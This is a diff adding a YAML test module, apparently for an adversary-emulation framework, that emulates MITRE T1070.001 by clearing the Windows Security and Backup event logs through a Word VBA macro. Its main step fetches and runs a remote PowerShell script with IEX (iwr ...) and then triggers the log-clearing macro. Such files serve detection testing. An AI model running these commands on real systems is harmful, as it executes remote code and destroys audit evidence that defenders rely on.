@@ -1,0 +1,34 @@
+api_version: "2.0"
+name: Clear Event Logs via VBA
+description: "This module utilizes WMI via VBA to clear the Security and Backup eventlogs from the system. \n\nElevation is required for this module to execute properly, otherwise WINWORD will throw an \"Access Denied\" error\n"
+uuid: 1b682d84-f075-4f93-9a89-8a8de19ffd6e
+mitre:
+    tactics:
+        - 'TA0005: Defense Evasion'
+    techniques:
+        - 'T1070: Indicator Removal'
+    subtechniques:
+        - 'T1070.001: Clear Windows Event Logs'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: |
+        Microsoft Word must be installed
+      inline: |
+        try {
+          New-Object -COMObject "Word.Application" | Out-Null
+          Stop-Process -Name "winword"
+          exit 0
+        } catch { {Write-Host "You will need to install Microsoft Word manually to meet this requirement"
+        } }
+      executor: powershell
+    - name: clear-event-logs-via-vba
+      inline: |
+        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+        IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
+        Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1070.001\src\T1070.001-macrocode.txt" -officeProduct "Word" -sub "ClearLogs"
+      executor: powershell
+      cleanup:
+        inline: ""
+        executor: powershell
